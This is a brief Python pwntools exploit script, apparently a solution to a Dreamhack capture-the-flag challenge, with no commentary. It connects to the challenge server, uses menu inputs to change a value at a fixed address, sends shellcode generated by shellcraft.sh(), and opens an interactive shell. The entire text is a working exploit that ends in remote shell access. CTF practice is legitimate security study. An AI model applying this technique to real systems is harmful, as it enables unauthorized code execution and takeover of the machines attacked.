from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17941
r = remote(HOST, PORT)

mode=0x602090
sh=asm(shellcraft.sh())

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b': ', str(mode).encode())
r.sendlineafter(b': ', b'2')

r.sendlineafter(b'> ' , b'1')
r.sendlineafter(b': ', sh)

r.sendlineafter(b'> ', b'2')
r.interactive()